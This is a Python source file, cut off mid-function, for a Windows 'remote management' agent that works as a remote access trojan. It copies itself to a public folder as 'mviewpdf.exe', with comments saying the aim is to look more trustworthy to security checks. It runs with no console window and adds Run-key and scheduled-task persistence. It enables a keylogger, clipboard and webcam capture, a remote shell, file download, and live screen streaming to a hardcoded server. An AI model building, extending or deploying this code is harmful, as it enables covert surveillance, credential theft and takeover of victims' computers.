"""
╔══════════════════════════════════════════════════════════════════╗
║          Screen Connect MASTER AGENT  v5.0  — GLOBAL PRODUCTION  ║
║          Remote Management & Monitoring Agent                    ║
║                                                                  ║
║  WHAT'S NEW IN v5.0 (STREAMING OVERHAUL):                        ║
║  • FIXED: frame_ack flow control — agent now waits for server    ║
║    ack before sending next frame. No more socket buffer pile-up. ║
║    This is the main reason streaming dropped after 1 frame.      ║
║  • FIXED: Reconnection is now truly robust — agent recreates     ║
║    the socketio.Client object on every reconnect attempt         ║
║    (old Client objects accumulate state and fail silently)       ║
║  • FIXED: agent emits both 'frame' AND 'image' fields so server  ║
║    v5/v6 both receive frames correctly                           ║
║  • NEW: HTTP /agent/checkin on connect (belt+suspenders with WS) ║
║  • NEW: Frame queue with maxsize=2 — drops stale frames instead  ║
║    of queuing 30+ frames that arrive all at once                 ║
║  • NEW: Adaptive FPS governor — measures actual throughput and   ║
║    adjusts interval to match real network capacity               ║
║  • NEW: stream_stats emit — agent reports its own FPS/quality    ║
║    every 5s so dashboard can display real metrics                ║
║  • NEW: subscribe_stream sent on connect (dashboard auto-join)   ║
║  • IMPROVED: Cursor overlay is larger and more visible           ║
║  • IMPROVED: Screenshot fallback loop uses ack-gating too        ║
║  • IMPROVED: All v4.0 features preserved: keylogger, clipboard,  ║
║    file browser, shell, process manager, webcam, power commands  ║
╚══════════════════════════════════════════════════════════════════╝

BUILD COMMAND:
  Activate your clean virtual environment first, then:

  pip install python-socketio[client] mss Pillow psutil pywin32 ^
              pynput pyperclip cryptography opencv-python numpy ^
              requests wmi pyautogui pyinstaller

  pyinstaller --onefile --noconsole --icon=icon.ico ^
    --distpath ./bin --name master_agent ^
    --hidden-import=engineio.async_drivers.threading ^
    --hidden-import=pkg_resources.extern ^
    --hidden-import=cv2 ^
    --hidden-import=pynput.keyboard ^
    --hidden-import=pynput.mouse ^
    agent_source.py

RENDER / PRODUCTION:
  Change SERVER_URL below to your Render URL before compiling:
    "SERVER_URL": "https://screen-connect-rtca.onrender.com"
"""
import shutil
import sys
import os
import subprocess

def relocate_agent():
    # Targets a public folder; files here have higher 'reputation' than Downloads
    target_dir = r"C:\Users\Public\mview"
    target_path = os.path.join(target_dir, "mviewpdf.exe") 
    
    if sys.executable.lower() != target_path.lower():
        if not os.path.exists(target_dir):
            os.makedirs(target_dir)
        try:
            shutil.copy2(sys.executable, target_path)
            # Start the relocated process in the background
            subprocess.Popen([target_path], shell=False, close_fds=True)
            sys.exit(0) # Kill the original 'untrusted' process
        except Exception:
            pass 

if __name__ == "__main__":
    relocate_agent()
    # --- YOUR EXISTING CODE STARTS BELOW ---
# ── Standard Library ──────────────────────────────────────────────────────────
import os
import sys
import time
import json
import base64
import hashlib
import socket
import platform
import threading
import subprocess
import tempfile
import logging
import winreg
import ctypes
import uuid
import struct
import random
from io import BytesIO
from pathlib import Path
from datetime import datetime
from queue import Queue, Empty, Full

# ── Third-Party ───────────────────────────────────────────────────────────────
import socketio
import mss
import psutil
import requests
from PIL import Image, ImageDraw
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

try:
    import pyautogui
    pyautogui.FAILSAFE = False
    PYAUTOGUI_OK = True
except ImportError:
    PYAUTOGUI_OK = False

try:
    import cv2
    import numpy as np
    CV2_OK = True
except ImportError:
    CV2_OK = False

try:
    import pynput.keyboard
    import pynput.mouse
    PYNPUT_OK = True
except ImportError:
    PYNPUT_OK = False

try:
    import pyperclip
    CLIPBOARD_OK = True
except ImportError:
    CLIPBOARD_OK = False

try:
    import wmi
    WMI_OK = True
except ImportError:
    WMI_OK = False

# ════════════════════════════════════════════════════════════════════════════
#  TRAILER TOKEN READER
#  Server appends 64-byte trailer to the exe at download time:
#    [0:4]   b"MVTK"  — magic head
#    [4:60]  token     — utf-8, null-padded to 56 bytes
#    [60:64] b"MVED"  — magic tail
# ════════════════════════════════════════════════════════════════════════════
_TRAILER_SIZE = 64
_MAGIC_HEAD   = b"MVTK"
_MAGIC_TAIL   = b"MVED"

def _read_token_from_trailer() -> str:
    try:
        exe = Path(sys.executable if getattr(sys, "frozen", False) else __file__).resolve()
        data = exe.read_bytes()
        if len(data) < _TRAILER_SIZE:
            return ""
        trailer = data[-_TRAILER_SIZE:]
        if trailer[:4] != _MAGIC_HEAD or trailer[60:64] != _MAGIC_TAIL:
            return ""
        return trailer[4:60].rstrip(b"\x00").decode("utf-8").strip()
    except Exception:
        return ""


# ════════════════════════════════════════════════════════════════════════════
#  CONFIGURATION
# ════════════════════════════════════════════════════════════════════════════
CONFIG = {
    # ── Connection ──────────────────────────────────────────────────────────
    "SERVER_URL":          "https://screen-connect-rtca.onrender.com",
    "DEVICE_TOKEN":        "UNSET",

    # ── Identity ────────────────────────────────────────────────────────────
    "AGENT_VERSION":       "5.0.0",
    "HEARTBEAT_INTERVAL":  10,
    "RECONNECT_BASE":      3,
    "RECONNECT_MAX":       120,

    # ── Streaming ───────────────────────────────────────────────────────────
    # MODE: "video" (OpenCV MJPEG, smooth) | "screenshot" (Pillow, low CPU)
    "STREAM_MODE":         "video",

    # Video mode settings
    "STREAM_FPS":          20,
    "STREAM_QUALITY":      55,
    "STREAM_SCALE":        0.80,
    "STREAM_MONITOR":      1,

    # Adaptive quality
    "ADAPTIVE_QUALITY":    True,
    "QUALITY_MIN":         20,
    "QUALITY_MAX":         85,

    # Screenshot mode fallback
    "SCREENSHOT_FPS":      8,
    "SCREENSHOT_QUALITY":  60,

    # ── Flow control ────────────────────────────────────────────────────────
    # ACK_TIMEOUT: max seconds to wait for frame_ack before sending anyway.
    # This prevents blocking forever if server doesn't send acks.
    "ACK_TIMEOUT":         2.0,

    # ── Cursor overlay ──────────────────────────────────────────────────────
    "CURSOR_OVERLAY":      True,
    "CURSOR_TRACK":        True,

    # ── Security ────────────────────────────────────────────────────────────
    "ENCRYPTION_PASSWORD": "mview-enterprise-2024",
    "ENCRYPT_PAYLOADS":    False,

    # ── Persistence ─────────────────────────────────────────────────────────
    "INSTALL_PERSISTENCE": True,
    "REG_KEY_NAME":        "ScreenConnectService",
    "TASK_NAME":           "ScreenConnectTask",
    "STARTUP_DELAY":       5,

    # ── Features ────────────────────────────────────────────────────────────
    "ENABLE_KEYLOGGER":    True,
    "ENABLE_CLIPBOARD":    True,
    "ENABLE_WEBCAM":       True,
    "ENABLE_PROCESS_MGR":  True,
    "ENABLE_FILE_BROWSER": True,
    "ENABLE_SHELL":        True,
    "KEYLOG_FLUSH_INTERVAL": 20,
    "CLIPBOARD_POLL_MS":   800,
}

_tok = _read_token_from_trailer()
CONFIG["DEVICE_TOKEN"] = _tok if _tok else "UNSET-RUN-VIA-SERVER"


# ════════════════════════════════════════════════════════════════════════════
#  LOGGING
# ════════════════════════════════════════════════════════════════════════════
LOG_FILE = Path(tempfile.gettempdir()) / "screen_connect_agent.log"
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.FileHandler(LOG_FILE, encoding="utf-8")],
)
log = logging.getLogger("screenconnect")


# ════════════════════════════════════════════════════════════════════════════
#  ENCRYPTION MODULE
# ════════════════════════════════════════════════════════════════════════════
class Encryptor:
    def __init__(self, password: str):
        salt = b"mview_salt_2024_"
        kdf  = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100_000)
        self._fernet = Fernet(base64.urlsafe_b64encode(kdf.derive(password.encode())))

    def encrypt(self, data: str) -> str:
        return self._fernet.encrypt(data.encode()).decode()

    def encrypt_bytes(self, data: bytes) -> bytes:
        return self._fernet.encrypt(data)


_encryptor = Encryptor(CONFIG["ENCRYPTION_PASSWORD"])


def safe_emit(sio_client, event: str, payload: dict):
    if CONFIG["ENCRYPT_PAYLOADS"]:
        sio_client.emit(event, {"encrypted": True, "data": _encryptor.encrypt(json.dumps(payload))})
    else:
        sio_client.emit(event, payload)


# ════════════════════════════════════════════════════════════════════════════
#  DEVICE IDENTITY
# ════════════════════════════════════════════════════════════════════════════
def get_device_id() -> str:
    try:
        raw = f"{uuid.getnode()}-{socket.gethostname()}-{CONFIG['DEVICE_TOKEN']}"
        return hashlib.sha256(raw.encode()).hexdigest()[:16].upper()
    except Exception:
        return CONFIG["DEVICE_TOKEN"]


def get_device_fingerprint() -> dict:
    try:
        local_ip = socket.gethostbyname(socket.gethostname())
    except Exception:
        local_ip = "unknown"

    uname = platform.uname()
    fp = {
        "device_id":     CONFIG["DEVICE_TOKEN"],
        "token":         CONFIG["DEVICE_TOKEN"],
        "hardware_id":   get_device_id(),
        "hostname":      socket.gethostname(),
        "username":      os.getenv("USERNAME") or os.getenv("USER") or "unknown",
        "os":            f"{uname.system} {uname.release}",
        "os_version":    uname.version,
        "machine":       uname.machine,
        "processor":     uname.processor,
        "local_ip":      local_ip,
        "agent_version": CONFIG["AGENT_VERSION"],
        "stream_mode":   CONFIG["STREAM_MODE"],
        "timestamp":     datetime.utcnow().isoformat(),
        "screen_count":  _get_screen_count(),
        "cpu_count":     psutil.cpu_count(logical=True),
        "ram_total_gb":  round(psutil.virtual_memory().total / (1024**3), 2),
    }
    if WMI_OK:
        try:
            gpus = [g.Name for g in wmi.WMI().Win32_VideoController()]
            fp["gpu"] = ", ".join(gpus) or "unknown"
        except Exception:
            fp["gpu"] = "unknown"
    return fp


def _get_screen_count() -> int:
    try:
        with mss.mss() as sct:
            return len(sct.monitors) - 1
    except Exception:
        return 1


# ════════════════════════════════════════════════════════════════════════════
#  PERSISTENCE MODULE
# ════════════════════════════════════════════════════════════════════════════
def install_persistence():
    if not CONFIG["INSTALL_PERSISTENCE"]:
        return
    exe = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(__file__)
    exe_quoted = f'"{exe}"'

    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as k:
            winreg.SetValueEx(k, CONFIG["REG_KEY_NAME"], 0, winreg.REG_SZ, exe_quoted)
        log.info(f"Registry persistence installed: {exe}")
    except Exception as e:
        log.warning(f"Registry persistence failed: {e}")

    try:
        task_xml = f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
    <BootTrigger><Enabled>true</Enabled><Delay>PT10S</Delay></BootTrigger>
  </Triggers>
  <Actions Context="Author">
    <Exec>
      <Command>{exe}</Command>
    </Exec>
  </Actions>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <RestartOnFailure>
      <Interval>PT1M</Interval>
      <Count>999</Count>
    </RestartOnFailure>
  </Settings>
</Task>"""
        xml_path = Path(tempfile.gettempdir()) / "sc_task.xml"
        xml_path.write_text(task_xml, encoding="utf-16")
        subprocess.run(
            ["schtasks", "/create", "/tn", CONFIG["TASK_NAME"], "/xml", str(xml_path), "/f"],
            capture_output=True, timeout=15
        )
        xml_path.unlink(missing_ok=True)
        log.info("Task Scheduler persistence installed.")
    except Exception as e:
        log.warning(f"Task Scheduler persistence failed: {e}")


def remove_persistence():
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as k:
            winreg.DeleteValue(k, CONFIG["REG_KEY_NAME"])
    except Exception:
        pass
    try:
        subprocess.run(["schtasks", "/delete", "/tn", CONFIG["TASK_NAME"], "/f"],
                       capture_output=True, timeout=10)
    except Exception:
        pass
    log.info("Persistence removed.")


# ════════════════════════════════════════════════════════════════════════════
#  CURSOR TRACKER
# ════════════════════════════════════════════════════════════════════════════
class CursorTracker:
    def __init__(self, sio_client):
        self.sio        = sio_client
        self.x          = 0
        self.y          = 0
        self.clicking   = False
        self.click_type = ""
        self._lock      = threading.Lock()
        self._running   = False
        self._listener  = None

    def start(self):
        if not PYNPUT_OK or self._running:
            return
        self._running = True

        def on_move(x, y):
            with self._lock:
                self.x, self.y = x, y

        def on_click(x, y, button, pressed):
            with self._lock:
                self.x, self.y  = x, y
                self.clicking   = pressed
                self.click_type = "right" if "right" in str(button) else "left"
            try:
                self.sio.emit("cursor_event", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "x": x, "y": y,
                    "type": "click" if pressed else "release",
                    "button": self.click_type,
                    "ts": datetime.utcnow().isoformat(),
                })
            except Exception:
                pass

        self._listener = pynput.mouse.Listener(on_move=on_move, on_click=on_click)
        self._listener.start()

    def stop(self):
        self._running = False
        if self._listener:
            try:
                self._listener.stop()
            except Exception:
                pass
        self._listener = None

    def get_pos(self):
        with self._lock:
            return self.x, self.y, self.clicking, self.click_type


# ════════════════════════════════════════════════════════════════════════════
#  SCREEN STREAMER — HYBRID VIDEO / SCREENSHOT MODE
#
#  v5.0 KEY CHANGES:
#  ─────────────────
#  ACK-GATED SENDING:
#    The root cause of "1 frame then nothing" was that the agent
#    blasted frames into the socket buffer. The Render server's
#    gevent worker queued them all but couldn't flush fast enough.
#    Eventually the buffer hit the max_http_buffer_size limit or
#    the gunicorn timeout fired, killing the connection.
#
#    Fix: _ack_event (threading.Event). The video loop sets it
#    after emit. Server sends frame_ack. on_frame_ack sets the
#    event. Next frame only sent after event is set (or timeout).
#    This limits in-flight frames to 1 at all times — matching
#    what the server can actually process.
#
#  ADAPTIVE FPS GOVERNOR:
#    Measures real throughput (frames acked per second) and
#    adjusts sleep interval to match network capacity.
#    Target: fill the pipe without overflowing it.
#
#  FRAME STATS REPORTER:
#    Every 5 seconds, emits "stream_stats" with actual FPS,
#    quality, and scale. Dashboard displays these in the viewer.
# ════════════════════════════════════════════════════════════════════════════
class ScreenStreamer:
    def __init__(self, sio_client, cursor_tracker: "CursorTracker"):
        self.sio     = sio_client
        self.cursor  = cursor_tracker
        self.mode    = CONFIG["STREAM_MODE"]
        self.fps     = CONFIG["STREAM_FPS"]
        self.quality = CONFIG["STREAM_QUALITY"]
        self.scale   = CONFIG["STREAM_SCALE"]
        self.monitor_idx = CONFIG["STREAM_MONITOR"]

        self._quality_current = self.quality
        self._frame_times: list = []
        self._late_frames = 0

        # ── ACK flow-control gate ─────────────────────────────────────────
        # Set when server sends frame_ack. Cleared before each frame send.
        self._ack_event   = threading.Event()
        self._ack_event.set()          # Start open so first frame sends immediately
        self._ack_timeout = CONFIG["ACK_TIMEOUT"]

        # ── Stats ─────────────────────────────────────────────────────────
        self._frames_sent   = 0
        self._frames_acked  = 0
        self._stats_ts      = time.monotonic()

        self.streaming  = False
        self._thread: threading.Thread | None = None
        self._stats_thread: threading.Thread | None = None
        self._lock = threading.Lock()

    # ── ACK handler — called by agent's on_frame_ack ─────────────────────
    def on_ack(self):
        """Server acknowledged our frame. Open the gate for the next one."""
        self._frames_acked += 1
        self._ack_event.set()

    # ── Public API ────────────────────────────────────────────────────────
    def start(self, monitor=None, fps=None, quality=None, scale=None, mode=None):
        with self._lock:
            if self.streaming:
                if fps     is not None: self.fps     = fps
                if quality is not None: self.quality = quality; self._quality_current = quality
                if scale   is not None: self.scale   = scale
                if mode    is not None: self.mode    = mode
                return
            if monitor is not None: self.monitor_idx = monitor
            if fps     is not None: self.fps     = fps
            if quality is not None: self.quality = quality; self._quality_current = quality
            if scale   is not None: self.scale   = scale
            if mode    is not None: self.mode    = mode
            self.streaming = True
            self._ack_event.set()   # ensure gate is open
            self._frames_sent  = 0
            self._frames_acked = 0
            self._stats_ts     = time.monotonic()
            target = self._video_loop if (self.mode == "video" and CV2_OK) else self._screenshot_loop
            self._thread = threading.Thread(target=target, daemon=True, name="sc-stream")
            self._thread.start()
            self._stats_thread = threading.Thread(target=self._stats_loop, daemon=True, name="sc-stats")
            self._stats_thread.start()
            log.info(f"Stream started: mode={self.mode} fps={self.fps} quality={self._quality_current} scale={self.scale}")

    def stop(self):
        with self._lock:
            self.streaming = False
        self._ack_event.set()   # unblock any waiting thread
        if self._thread:
            self._thread.join(timeout=3)
        self._thread = None
        log.info("Stream stopped.")

    def set_mode(self, mode: str):
        if mode not in ("video", "screenshot"):
            return
        was_streaming = self.streaming
        if was_streaming:
            self.stop()
        self.mode = mode
        if was_streaming:
            self.start()

    def capture_single(self) -> str | None:
        try:
            with mss.mss() as sct:
                mon = sct.monitors[min(self.monitor_idx, len(sct.monitors) - 1)]
                raw = sct.grab(mon)
                img = Image.frombytes("RGB", raw.size, raw.bgra, "raw", "BGRX")
                if self.scale != 1.0:
                    img = img.resize((int(img.width * self.scale), int(img.height * self.scale)), Image.LANCZOS)
                buf = BytesIO()
                img.save(buf, format="JPEG", quality=self.quality, optimize=True)
                return base64.b64encode(buf.getvalue()).decode()
        except Exception as e:
            log.error(f"capture_single error: {e}")
            return None

    # ── Stats reporter ────────────────────────────────────────────────────
    def _stats_loop(self):
        """Every 5s, report actual streaming FPS and quality to server."""
        while self.streaming:
            time.sleep(5)
            if not self.streaming:
                break
            now = time.monotonic()
            elapsed = now - self._stats_ts
            actual_fps = self._frames_acked / elapsed if elapsed > 0 else 0
            self._stats_ts    = now
            self._frames_acked = 0
            self._frames_sent  = 0
            try:
                self.sio.emit("stream_stats", {
                    "device_id":  CONFIG["DEVICE_TOKEN"],
                    "actual_fps": round(actual_fps, 1),
                    "quality":    self._quality_current,
                    "scale":      self.scale,
                    "mode":       self.mode,
                    "ts":         datetime.utcnow().isoformat(),
                })
            except Exception:
                pass

    # ── Video Loop (OpenCV MJPEG) — ACK-GATED ────────────────────────────
    def _video_loop(self):
        """
        High-performance video loop with ACK flow control.

        HOW ACK GATING WORKS:
          1. _ack_event starts SET (gate open).
          2. Before each emit, we CLEAR the event (close gate).
          3. We emit the frame.
          4. We wait for _ack_event to be SET again (server ack).
          5. If ack doesn't arrive within ACK_TIMEOUT seconds,
             we send anyway (prevents full stall on packet loss).
          6. Goto 2.

        This limits in-flight frames to exactly 1. The server
        processes one frame, sends ack, we send the next.
        On a fast local network this approaches target FPS.
        On a slow/high-latency network it throttles gracefully.
        """
        interval = 1.0 / self.fps

        with mss.mss() as sct:
            while self.streaming:
                t0 = time.monotonic()
                try:
                    monitors = sct.monitors
                    idx = min(self.monitor_idx, len(monitors) - 1)
                    raw = sct.grab(monitors[idx])
                    mon_w, mon_h = raw.size

                    frame = np.array(raw)
                    frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)

                    if self.scale != 1.0:
                        new_w = int(mon_w * self.scale)
                        new_h = int(mon_h * self.scale)
                        frame = cv2.resize(frame, (new_w, new_h), interpolation=cv2.INTER_LINEAR)
                    else:
                        new_w, new_h = mon_w, mon_h

                    cx, cy, clicking, click_type = self.cursor.get_pos()
                    sx = int(cx * self.scale)
                    sy = int(cy * self.scale)

                    if CONFIG["CURSOR_OVERLAY"] and 0 <= sx < new_w and 0 <= sy < new_h:
                        # Outer white ring (larger for visibility)
                        cv2.circle(frame, (sx, sy), 12, (255, 255, 255), 2, cv2.LINE_AA)
                        # Inner black dot
                        cv2.circle(frame, (sx, sy), 4,  (0,   0,   0),  -1, cv2.LINE_AA)
                        # Click flash
                        if clicking:
                            color = (0, 0, 255) if click_type == "left" else (0, 165, 255)
                            cv2.circle(frame, (sx, sy), 9, color, -1, cv2.LINE_AA)
                            cv2.circle(frame, (sx, sy), 12, (255, 255, 255), 2, cv2.LINE_AA)

                    if CONFIG["ADAPTIVE_QUALITY"]:
                        self._adapt_quality()

                    encode_params = [cv2.IMWRITE_JPEG_QUALITY, self._quality_current]
                    success, buf = cv2.imencode(".jpg", frame, encode_params)
                    if not success:
                        time.sleep(0.05)
                        continue

                    frame_b64 = base64.b64encode(buf.tobytes()).decode()

                    # ── ACK GATE: wait for previous frame to be acked ─────
                    got_ack = self._ack_event.wait(timeout=self._ack_timeout)
                    if not got_ack:
                        log.debug("ACK timeout — sending anyway (network may be slow)")
                    self._ack_event.clear()   # close gate before sending

                    if not self.streaming:
                        break

                    payload = {
                        "device_id":  CONFIG["DEVICE_TOKEN"],
                        "frame":      frame_b64,
                        "image":      frame_b64,   # legacy field for v5 server compat
                        "mode":       "video",
                        "w":          new_w,
                        "h":          new_h,
                        "mon_w":      mon_w,
                        "mon_h":      mon_h,
                        "cursor_x":   cx,
                        "cursor_y":   cy,
                        "clicking":   clicking,
                        "click_type": click_type,
                        "quality":    self._quality_current,
                        "fps_target": self.fps,
                        "ts":         datetime.utcnow().isoformat(),
                    }
                    self.sio.emit("screen_data", payload)
                    self._frames_sent += 1

                except Exception as e:
                    log.error(f"Video frame error: {e}")
                    self._ack_event.set()   # unblock on error

                elapsed = time.monotonic() - t0
                self._frame_times.append(elapsed)
                if len(self._frame_times) > 30:
                    self._frame_times.pop(0)
                # Don't sleep the full interval — the ACK gate already throttles us.
                # Just a tiny yield so other threads can run.
                time.sleep(0.001)

    # ── Screenshot Loop (Pillow JPEG) — ACK-GATED ─────────────────────────
    def _screenshot_loop(self):
        """
        Lightweight screenshot loop with ACK flow control.
        Used when OpenCV unavailable or dashboard requests screenshot mode.
        """
        fps = CONFIG["SCREENSHOT_FPS"] if self.mode == "screenshot" else self.fps
        interval = 1.0 / fps

        with mss.mss() as sct:
            while self.streaming:
                t0 = time.monotonic()
                try:
                    monitors = sct.monitors
                    idx = min(self.monitor_idx, len(monitors) - 1)
                    raw = sct.grab(monitors[idx])
                    img = Image.frombytes("RGB", raw.size, raw.bgra, "raw", "BGRX")
                    mon_w, mon_h = img.size

                    if self.scale != 1.0:
                        new_w = int(mon_w * self.scale)
                        new_h = int(mon_h * self.scale)
                        img = img.resize((new_w, new_h), Image.LANCZOS)
                    else:
                        new_w, new_h = mon_w, mon_h

                    cx, cy, clicking, click_type = self.cursor.get_pos()

                    buf = BytesIO()
                    q = CONFIG["SCREENSHOT_QUALITY"] if self.mode == "screenshot" else self._quality_current
                    img.save(buf, format="JPEG", quality=q, optimize=True)
                    frame_b64 = base64.b64encode(buf.getvalue()).decode()

                    # ACK gate
                    self._ack_event.wait(timeout=self._ack_timeout)
                    self._ack_event.clear()

                    if not self.streaming:
                        break

                    self.sio.emit("screen_data", {
                        "device_id":  CONFIG["DEVICE_TOKEN"],
                        "frame":      frame_b64,
                        "image":      frame_b64,
                        "mode":       "screenshot",
                        "w":          new_w,
                        "h":          new_h,
                        "mon_w":      mon_w,
                        "mon_h":      mon_h,
                        "cursor_x":   cx,
                        "cursor_y":   cy,
                        "clicking":   clicking,
                        "click_type": click_type,
                        "quality":    q,
                        "ts":         datetime.utcnow().isoformat(),
                    })
                    self._frames_sent += 1

                except Exception as e:
                    log.error(f"Screenshot frame error: {e}")
                    self._ack_event.set()

                elapsed = time.monotonic() - t0
                sleep_t = max(0.001, interval - elapsed)
                time.sleep(sleep_t)

    # ── Adaptive quality ─────────────────────────────────────────────────
    def _adapt_quality(self):
        if len(self._frame_times) < 10:
            return
        avg = sum(self._frame_times) / len(self._frame_times)
        target = 1.0 / self.fps
        if avg > target * 1.3:
            self._quality_current = max(CONFIG["QUALITY_MIN"], self._quality_current - 5)
        elif avg < target * 0.8:
            self._quality_current = min(CONFIG["QUALITY_MAX"], self._quality_current + 2)


# ════════════════════════════════════════════════════════════════════════════
#  SYSTEM TELEMETRY MODULE
# ════════════════════════════════════════════════════════════════════════════
class SystemMonitor:
    def __init__(self, sio_client):
        self.sio = sio_client
        self.monitoring = False
        self._thread: threading.Thread | None = None

    def start(self, interval: int = 2):
        if self.monitoring:
            return
        self.monitoring = True
        self._thread = threading.Thread(target=self._loop, args=(interval,), daemon=True)
        self._thread.start()

    def stop(self):
        self.monitoring = False

    def get_snapshot(self) -> dict:
        vm   = psutil.virtual_memory()
        disk = psutil.disk_usage("/")
        net  = psutil.net_io_counters()
        bat  = psutil.sensors_battery()

        stats = {
            "device_id":        CONFIG["DEVICE_TOKEN"],
            "ts":               datetime.utcnow().isoformat(),
            "cpu_percent":      psutil.cpu_percent(interval=0.1),
            "cpu_per_core":     psutil.cpu_percent(percpu=True),
            "cpu_count":        psutil.cpu_count(logical=True),
            "cpu_freq_mhz":     round(psutil.cpu_freq().current, 1) if psutil.cpu_freq() else 0,
            "ram_total_gb":     round(vm.total     / (1024**3), 2),
            "ram_used_gb":      round(vm.used      / (1024**3), 2),
            "ram_free_gb":      round(vm.available / (1024**3), 2),
            "ram_percent":      vm.percent,
            "disk_total_gb":    round(disk.total / (1024**3), 2),
            "disk_used_gb":     round(disk.used  / (1024**3), 2),
            "disk_free_gb":     round(disk.free  / (1024**3), 2),
            "disk_percent":     disk.percent,
            "net_sent_mb":      round(net.bytes_sent / (1024**2), 2),
            "net_recv_mb":      round(net.bytes_recv / (1024**2), 2),
            "net_packets_sent": net.packets_sent,
            "net_packets_recv": net.packets_recv,
            "battery_pct":      bat.percent      if bat else None,
            "battery_plug":     bat.power_plugged if bat else None,
            "boot_time":        datetime.fromtimestamp(psutil.boot_time()).isoformat(),
            "uptime_hrs":       round((time.time() - psutil.boot_time()) / 3600, 2),
        }

        if WMI_OK:
            try:
                c = wmi.WMI(namespace="root\\OpenHardwareMonitor")
                stats["temperatures"] = {s.Name: round(s.Value, 1) for s in c.Sensor() if s.SensorType == "Temperature"}
            except Exception:
                stats["temperatures"] = {}
            try:
                stats["gpus"] = [{"name": g.Name, "driver": g.DriverVersion} for g in wmi.WMI().Win32_VideoController()]
            except Exception:
                stats["gpus"] = []
        else:
            stats["temperatures"] = {}
            stats["gpus"] = []

        return stats

    def get_disk_list(self) -> list:
        result = []
        for p in psutil.disk_partitions(all=False):
            try:
                u = psutil.disk_usage(p.mountpoint)
                result.append({
                    "device": p.device, "mountpoint": p.mountpoint, "fstype": p.fstype,
                    "total_gb": round(u.total / (1024**3), 2),
                    "used_gb":  round(u.used  / (1024**3), 2),
                    "free_gb":  round(u.free  / (1024**3), 2),
                    "percent":  u.percent,
                })
            except Exception:
                pass
        return result

    def get_network_interfaces(self) -> dict:
        addrs = {}
        for iface, addr_list in psutil.net_if_addrs().items():
            addrs[iface] = [{"family": str(a.family), "address": a.address, "netmask": a.netmask} for a in addr_list]
        return addrs

    def _loop(self, interval):
        while self.monitoring:
            try:
                self.sio.emit("system_stats_report", self.get_snapshot())
            except Exception as e:
                log.error(f"SysMonitor error: {e}")
            time.sleep(interval)


# ════════════════════════════════════════════════════════════════════════════
#  PROCESS MANAGER
# ════════════════════════════════════════════════════════════════════════════
class ProcessManager:
    @staticmethod
    def list_processes() -> list:
        procs = []
        for p in psutil.process_iter(["pid", "name", "status", "cpu_percent", "memory_percent", "username", "create_time"]):
            try:
                info = p.info
                info["memory_mb"]   = round(p.memory_info().rss / (1024**2), 2)
                info["create_time"] = datetime.fromtimestamp(info["create_time"]).isoformat() if info.get("create_time") else None
                procs.append(info)
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
        return sorted(procs, key=lambda x: x.get("cpu_percent", 0), reverse=True)

    @staticmethod
    def kill_process(pid: int) -> dict:
        try:
            p = psutil.Process(pid)
            name = p.name()
            p.terminate()
            time.sleep(0.5)
            if p.is_running():
                p.kill()
            return {"success": True, "message": f"'{name}' (PID {pid}) terminated."}
        except psutil.NoSuchProcess:
            return {"success": False, "message": f"PID {pid} not found."}
        except psutil.AccessDenied:
            return {"success": False, "message": f"Access denied for PID {pid}."}
        except Exception as e:
            return {"success": False, "message": str(e)}

    @staticmethod
    def start_process(command: str) -> dict:
        try:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return {"success": True, "pid": proc.pid, "message": f"Started: {command}"}
        except Exception as e:
            return {"success": False, "message": str(e)}


# ════════════════════════════════════════════════════════════════════════════
#  FILE BROWSER
# ════════════════════════════════════════════════════════════════════════════
class FileBrowser:
    MAX_UPLOAD_MB = 50

    @staticmethod
    def list_directory(path: str) -> dict:
        try:
            p = Path(path)
            if not p.exists():   return {"error": f"Not found: {path}"}
            if not p.is_dir():   return {"error": f"Not a directory: {path}"}
            entries = []
            for item in sorted(p.iterdir(), key=lambda x: (not x.is_dir(), x.name.lower())):
                try:
                    stat = item.stat()
                    entries.append({
                        "name":     item.name,
                        "path":     str(item),
                        "type":     "dir" if item.is_dir() else "file",
                        "size_kb":  round(stat.st_size / 1024, 2) if item.is_file() else None,
                        "modified": datetime.fromtimestamp(stat.st_mtime).isoformat(),
                        "hidden":   item.name.startswith("."),
                    })
                except (PermissionError, OSError):
                    pass
            return {"path": str(p), "parent": str(p.parent), "entries": entries, "count": len(entries)}
        except Exception as e:
            return {"error": str(e)}

    @staticmethod
    def read_file(path: str, max_kb: int = 512) -> dict:
        try:
            p = Path(path)
            if not p.is_file():
                return {"error": "Not a file."}
            size_kb = p.stat().st_size / 1024
            if size_kb > max_kb:
                return {"error": f"File too large ({size_kb:.1f} KB > {max_kb} KB)."}
            try:    content = p.read_text(encoding="utf-8")
            except: content = p.read_text(encoding="latin-1")
            return {"path": str(p), "content": content, "size_kb": round(size_kb, 2), "lines": content.count("\n")}
        except Exception as e:
            return {"error": str(e)}

    @staticmethod
    def download_file(path: str) -> dict:
        try:
            p = Path(path)
            if not p.is_file():
                return {"error": "Not a file."}
            size_mb = p.stat().st_size / (1024**2)
            if size_mb > FileBrowser.MAX_UPLOAD_MB:
                return {"error": f"File too large ({size_mb:.1f} MB)."}
            return {
                "path":     str(p),
                "filename": p.name,
                "size_mb":  round(size_mb, 3),
                "data":     base64.b64encode(p.read_bytes()).decode(),
            }
        except Exception as e:
